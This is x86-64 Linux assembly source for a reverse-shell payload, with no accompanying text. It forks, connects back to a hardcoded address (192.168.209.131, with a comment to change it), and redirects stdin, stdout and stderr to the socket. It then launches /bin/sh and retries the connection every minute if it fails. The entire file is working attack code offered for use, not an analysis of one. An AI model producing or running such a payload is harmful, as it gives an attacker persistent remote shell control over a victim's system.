	  section .text
	  global _start
_start:
	 
	;;socket()
	xor rax,rax
	 
	push 0                        ;socket(AF_INET, SOCK_STREAM , 0)
	push 0x1                      ;SOCK_STREAM
	push 10                       ;AF_INET
	pop rdi
	pop rsi
	pop rdx
	 
	 
	mov al,41 ;socket()
	 
	syscall
	xor rbx,rbx
	 
	mov rbx,rax ;storing socket descriptor
	 
	xor rdi,rdi
	xor rax,rax
	 
	mov al,57
	syscall
	 
	xor rdi,rdi
	cmp rax,rdi
	 
	je connect
	 
	xor rax,rax
	mov al,60
	syscall
	 
	 
	;-----------------------------------------------------
	;connect()
	 
	connect:
	xor rdx,rdx
	xor rsi,rsi
	 
	mul rsi
	 
	 
	;----------------------------
	;struct sockaddr_in6
	 
	push rsi
	push rsi
	push rsi
	push rsi
	push rsi
	 
	mov byte [rsp],10
	mov word [rsp+2],0xc005
	mov word [rsp+18],0xffff
	mov dword [rsp+20],0x83d1a8c0 ;just change it. current ipv4 address inet_addr("192.168.209.131")
	 
	;-----------------------------
	 
	mov rsi,rsp
	 
	mov dl,28
	 
	mov rdi,rbx
	 
	mov al,42
	syscall
	 
	xor rsi,rsi
	 
	cmp rax,rsi
	jne try_again ;it will reconnect after 1 min , if it is failed to connect
	 
	 
	;------------------------
	 
	;------------------
	 
	;;dup2(sd,0)
	xor rsi,rsi
	mul rsi
	 
	mov rdi,rbx
	mov al,33
	syscall
	 
	;------------
	 
	;------------------
	 
	;;dup2(sd,1)
	xor rax,rax
	inc rsi
	 
	mov rdi,rbx
	mov al,33
	syscall
	 
	;------------
	 
	;------------------
	 
	;;dup2(sd,2)
	xor rax,rax
	inc rsi
	 
	mov rdi,rbx
	mov al,33
	syscall
	 
	 
	;-----------------------
	 
	 
	;;execve("/////bin//sh",NULL,NULL)
	 
	xor rsi,rsi
	xor rdx,rdx
	mul rdx
	 
	mov qword r8,'/////bin'
	mov r10, '//sh'
	 
	push r10
	push r8
	 
	mov rdi,rsp
	 
	mov al,59
	syscall
	 
	 
	;-----------------------------
	 
	 
	try_again:
	xor rsi,rsi
	mul rsi
	 
	push rsi
	push byte 60 ;1 min
	 
	mov rdi,rsp
	 
	mov al,35
	syscall
	 
	jmp connect
